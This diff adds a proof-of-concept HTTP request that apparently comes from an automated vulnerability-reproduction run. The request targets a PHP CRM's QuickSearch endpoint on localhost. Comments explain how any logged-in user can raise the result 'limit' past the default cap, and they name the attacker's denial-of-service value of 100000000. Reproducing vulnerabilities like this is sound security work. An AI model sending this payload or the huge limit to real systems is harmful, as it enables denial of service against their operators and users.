@@ -1,0 +1,21 @@
+POST /index.php?module=Home&action=quicksearchQuery&to_pdf=true HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<authenticated non-admin session>
+User-Agent: Mozilla/5.0 cvehunter-stage10
+Content-Type: application/x-www-form-urlencoded
+
+data=%7B%22method%22%3A%22query%22%2C%22modules%22%3A%5B%22Accounts%22%5D%2C%22field_list%22%3A%5B%22name%22%2C%22id%22%5D%2C%22group%22%3A%22or%22%2C%22conditions%22%3A%5B%7B%22name%22%3A%22name%22%2C%22op%22%3A%22like_custom%22%2C%22end%22%3A%22%25%22%2C%22value%22%3A%22%22%7D%5D%2C%22limit%22%3A45%7D&query=
+
+# Decoded `data` JSON:
+# {"method":"query","modules":["Accounts"],"field_list":["name","id"],
+#  "group":"or","conditions":[{"name":"name","op":"like_custom","end":"%","value":""}],
+#  "limit":45}
+#
+# Any authenticated session works (QuickSearch is not admin-gated -- it backs
+# the autocomplete on every EditView). `to_pdf=true` is the real client's own
+# flag (include/javascript/quicksearch.js) for getting quicksearchQuery.php's
+# raw JSON instead of a full page render.
+#
+# Sent 3 times in this run: limit=15 (below the 20-row default cap),
+# limit=45 (above it), and no `limit` key at all (control) -- NOT the
+# attacker's real limit=100000000, which is bounded-DoS-unsafe to send.
